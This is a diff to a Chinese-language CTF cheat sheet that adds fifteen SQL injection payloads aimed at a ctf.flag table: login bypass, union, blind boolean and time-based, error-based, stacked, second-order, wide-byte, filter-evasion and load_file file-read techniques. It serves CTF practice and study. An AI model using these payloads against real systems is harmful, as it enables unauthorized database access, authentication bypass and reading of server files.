@@ -138,6 +138,57 @@ print(resp.text)
 ```shell
 docker run --rm -it -v $PWD:/work -w /work -u $UID:$GID brimstone/fastcoll  -o msg1.bin msg2.bin
 ```
-
-
-
+## SQL注入
+### SQL注入-001
+> 万能密码 `?username=admin' or 1=1 --+&password=1`
+### SQL注入-002
+> int型SQL注入 `?id=-1 union select 1,(select flag from ctf.flag),3 --+`
+### SQL注入-003
+> 字符型SQL注入 `?id=-1' union select 1,(select flag from ctf.flag),3 --+`
+### SQL注入-004
+> 双引号 `?id=-1" union select 1,(select flag from ctf.flag),3 --+`
+### SQL注入-005
+> 括号 `?id=-1) union select 1,(select flag from ctf.flag),3 --+`
+### SQL注入-006
+> 简单bool型
+> 单引号括号 `?id=-1') union select 1,(select flag from ctf.flag),3 --+`
+### SQL注入-007
+> 简单bool型
+```text
+?id=1 order by 3 --+ # 查当前字段 
+?id=1 and length(database()) = 3 --+ # 查询当前数据库长度
+?id=1 and length(@@version_compile_os)< {10} --+ #查询操作系统字符长度
+?id=1 and length(version())< {10} --+ #查询mysql版本字符长度
+?id=1 and length(database())< {10} --+ #查询当前库字符长度
+?id=1 and ascii(substr(sql语句,{1},1))={100} --+ #综合类查询
+```
+### SQL注入-008
+> 时间型
+```text
+?id=1 and if (ascii(substr(sql语句,{1},1)={1},1,sleep(5)) # 与sqlmap一致 休眠即可
+```
+### SQL注入-009
+> 报错注入 extractvalue、updaxml 有长度限制 可以采用倒叙
+```text
+?id=1 or extractvalue(0x0a,concat(0x0a,(select group_concat(flag) from ctf.flag)))--+
+?id=1 or extractvalue(0x0a,concat(0x0a,(select REVERSE(group_concat(flag)) from ctf.flag)))--+
+```
+### SQL注入-010
+> 堆叠注入
+```text
+?id=-1;select * from ctf.flag;
+```
+### SQL注入-011
+> 二次注入 先注册一个 为 `admin'#`的账户 ，后面修改它的密码，即修改admin的密码;
+### SQL注入-012
+> 宽字节注入 利用`%df`和转义符`\\`构成汉字进行利用
+> ?id=-1%df' union select 1,(select group_concat(flag) from ctf.flag),3 --+
+### SQL注入-013
+> 过滤了 ` （空格）+（加号）` 可以用 注释 `/**/` 绕过
+> `?id=-1'/**/union/**/select/**/1,(select/**/group_concat(flag)/**/from/**/ctf.flag),3/**/%23`
+### SQL注入-014
+> 过滤了 `,` 可以与 join 起 配合别名
+> `?id=-1' union select * from (select 1)A join((select group_concat(flag) from ctf.flag)B join(select 3)C) --+`
+### SQL注入-015
+> 文件读写, `?id=-1' union select 1,2,(select load_file('/flag'))--+`
+### 
